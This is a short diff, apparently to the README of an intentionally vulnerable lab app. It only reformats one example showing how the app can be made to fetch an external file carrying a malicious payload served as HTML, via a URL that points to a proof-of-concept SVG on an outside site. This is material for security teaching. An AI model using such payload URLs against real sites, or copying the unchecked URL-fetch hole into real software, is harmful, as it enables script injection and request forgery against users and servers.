@@ -79,7 +79,9 @@
  
   Simply fetch a file from external sites which has malicious payload with content type served as html
   
-  Example - http://localhost:4567/?url=http://brutelogic.com.br/poc.svg
+  Example -
+  
+      http://localhost:4567/?url=http://brutelogic.com.br/poc.svg
   
   
    
